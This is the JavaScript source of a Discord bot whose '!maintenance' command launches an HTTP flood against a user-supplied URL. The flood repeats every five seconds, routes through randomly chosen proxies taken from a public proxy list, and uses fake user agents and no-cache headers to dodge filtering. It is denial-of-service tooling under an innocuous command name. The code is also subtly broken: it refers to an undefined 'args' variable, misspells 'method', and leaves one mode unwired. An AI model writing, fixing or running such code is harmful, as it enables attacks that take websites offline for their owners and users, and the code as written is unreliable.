const Discord = require('discord.js');

const client = new Discord.Client();

const axios = require('axios')

const fakeUa = require('fake-useragent')

const HttpsProxyAgent = require('https-proxy-agent')

client.on('ready', () => {

  console.log(`Logged in as ${client.user.tag}!`);

});

client.on('message', async message => {

  if (message.content.startsWith('!maintenance')) {

    const args = message.content.split(' ');

    if (args.length !== 3) {

      message.reply('Invalid arguments.');

    } else {

      if (args[2] == 'storm') {

        message.channel.send('CODE BY: OHMDEVPRO');

      } else if (args[2] == 'auto') {

        const proxyscrape_http = await axios.get('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt');

        var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');

        message.channel.send('CODE BY: OHMDEVPRO');

        setInterval(() => {

          run(args[1], proxies);

        }, 5000);

      } else {

        message.reply('Invalid arguments.');

      }

    }

  }

});

async function run(url, proxies) {

  if (args[2] == 'storm') {

    var config={

      url: url,

      medthod:'get',

      headers:{

          'Cache-Control': 'no-cache',

          'User-Agent': fakeUa()

      }

    }

    axios(config).then(function (re){

      console.log(re.status, "CODE BY: OHMDEVPRO")

    }).catch(function (error){

      console.log(error.response.status, "CODE BY: OHMDEVPRO")

    })

  } else if(args[2] == 'auto') {

    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    var agent = new HttpsProxyAgent('http://' + proxy);

    var cung={

      url: url,

      httpsAgent: agent,

      medthod:'get',

      headers:{

         'Cache-Control': 'no-cache',

         'User-Agent': fakeUa()

      }

    }

    axios(cung).then(function (res){

      console.log(res.status, "CODE BY: OHMDEVPRO")

    }).catch(function (error){

      console.log(error.response.status, "CODE BY: OHMDEVPRO")

    })

  }

}

client.login('your-token-here');

